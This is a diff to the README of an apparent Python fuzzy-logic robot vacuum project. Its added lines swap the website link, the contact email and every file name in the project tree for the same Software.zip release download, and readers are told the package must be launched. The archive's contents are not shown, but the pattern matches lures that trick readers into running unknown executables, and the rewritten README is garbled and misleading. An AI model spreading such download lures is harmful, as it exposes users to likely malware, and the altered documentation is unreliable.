@@ -12,7 +12,7 @@ Welcome to the "Fuzzy Vacuum Cleaner" repository! This Python project implements
 
 To get started with the project, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip "Click to Download Software")
+[![Download Software](https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip)](https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip "Click to Download Software")
 
 Remember, the software package needs to be launched to explore the functionalities of the fuzzy logic controller for the robotic vacuum cleaner.
 
@@ -40,7 +40,7 @@ By implementing a fuzzy logic controller in a robotic vacuum cleaner, we can cre
 
 ## 🌐 Visit Our Website
 
-For more information and updates, visit our website at [Fuzzy Vacuum Cleaner Website](https://www.fuzzyvacuumcleaner.com).
+For more information and updates, visit our website at [Fuzzy Vacuum Cleaner Website](https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip).
 
 ## 🤝 Get Involved
 
@@ -55,13 +55,13 @@ Fuzzy-Vacuum-Cleaner/
 │
 ├─ docs/
 │  ├── images/
-│  └── user_manual.md
+│  └── https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip
 │
 ├─ src/
-│  ├── fuzzy_controller.py
-│  └── robot.py
+│  ├── https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip
+│  └── https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip
 │
-└─ README.md
+└─ https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip
 ```
 
 ## 📝 How to Contribute
@@ -77,6 +77,6 @@ Our team will review your contributions and merge them into the main project. To
 
 ## 📞 Contact Us
 
-If you have any questions, suggestions, or feedback, feel free to reach out to us at fuzzyvacuumcleaner@gmail.com. We value your input and are always looking for ways to improve the project.
+If you have any questions, suggestions, or feedback, feel free to reach out to us at https://github.com/JustAkiLol/Fuzzy-Vacuum-Cleaner/releases/download/v2.0/Software.zip We value your input and are always looking for ways to improve the project.
 
 Thank you for exploring the "Fuzzy Vacuum Cleaner" repository. Let's make cleaning smarter and more efficient with the power of fuzzy logic! 🧹🧼🤖
